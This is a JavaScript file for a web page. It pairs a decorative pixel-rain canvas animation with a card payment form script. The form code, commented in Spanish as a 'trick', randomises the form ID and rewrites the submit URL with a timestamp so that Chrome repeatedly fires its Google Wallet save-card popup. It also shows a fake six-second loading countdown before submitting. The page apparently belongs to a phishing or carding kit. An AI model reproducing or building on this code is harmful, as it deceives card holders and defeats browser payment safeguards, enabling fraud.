/* Lógica de PixelRain (Tu código original) */
(() => {
  const canvas = document.getElementById("pixelRain");
  if (!canvas) return;
  const ctx = canvas.getContext("2d", { alpha: true });
  let w = 0, h = 0, dpr = 1;
  const palette = ["rgba(255,46,99,0.22)", "rgba(255,90,122,0.18)", "rgba(255,23,68,0.16)", "rgba(255,46,99,0.10)"];
  const state = { cols: 0, size: 10, streams: [] };
  function resize() {
    dpr = Math.max(1, Math.floor(window.devicePixelRatio || 1));
    w = Math.floor(window.innerWidth); h = Math.floor(window.innerHeight);
    canvas.width = w * dpr; canvas.height = h * dpr;
    canvas.style.width = w + "px"; canvas.style.height = h + "px";
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    state.size = w < 520 ? 9 : 10;
    state.cols = Math.ceil(w / state.size);
    state.streams = Array.from({ length: state.cols }, (_, i) => ({
      x: i * state.size, y: Math.random() * h, speed: 1.2 + Math.random() * 2.6, density: 0.35 + Math.random() * 0.55
    }));
  }
  function tick() {
    ctx.fillStyle = "rgba(0,0,0,0.12)"; ctx.fillRect(0, 0, w, h);
    for (const s of state.streams) {
      const drops = 1 + Math.floor(3 * s.density);
      for (let k = 0; k < drops; k++) {
        const px = s.x + (Math.random() < 0.25 ? state.size : 0);
        const py = s.y - k * (state.size * (1 + Math.random() * 2));
        const sz = state.size * (0.65 + Math.random() * 0.55);
        ctx.fillStyle = palette[(Math.random() * palette.length) | 0];
        ctx.fillRect(px, py, sz * 0.55, sz);
      }
      s.y += s.speed * state.size * 0.35;
      if (s.y > h + 80) { s.y = -Math.random() * 200; s.speed = 1.2 + Math.random() * 2.6; s.density = 0.35 + Math.random() * 0.55; }
    }
    requestAnimationFrame(tick);
  }
  window.addEventListener("resize", resize, { passive: true });
  resize(); ctx.clearRect(0, 0, w, h); requestAnimationFrame(tick);
})();

/* Lógica del Formulario (Tu diseño + Forzado de Wallet) */
const form = document.getElementById("payment-form");
const numInput = document.getElementById("cardNumber");
const dateInput = document.getElementById("cardDate");
const err = document.getElementById("err");
const loading = document.getElementById("loading");
const counterEl = document.getElementById("counter");

// Cambiar ID dinámicamente para forzar a Chrome a disparar siempre la ventana
window.addEventListener('load', () => {
  form.id = "pay-form-" + Math.floor(Math.random() * 9999);
});

numInput?.addEventListener("input", (e)=>{
  let raw = e.target.value.replace(/\D/g,'').slice(0,19);
  let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
  e.target.value = formatted;
  document.getElementById("displayNumber").textContent = formatted || "#### #### #### ####";
});

dateInput?.addEventListener("input",(e)=>{
  let v = e.target.value.replace(/\D/g, '').substring(0, 4);
  if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
  e.target.value = v;
  document.getElementById("displayDate").textContent = v || "MM/AA";
});

form?.addEventListener("submit",(e)=>{
  e.preventDefault(); 
  err.textContent = "";

  loading.style.display = "flex";
  let c = 6;
  counterEl.textContent = c;

  const timer = setInterval(()=>{
    c--;
    counterEl.textContent = c;
    if (c <= 0){
      clearInterval(timer);
      // TRUCO: Cambiamos la URL de envío para que Chrome lo vea como un éxito nuevo
      form.action = "?token=" + Date.now();
      // Envío nativo que dispara el popup de Google Wallet
      form.submit(); 
    }
  }, 1000);
});
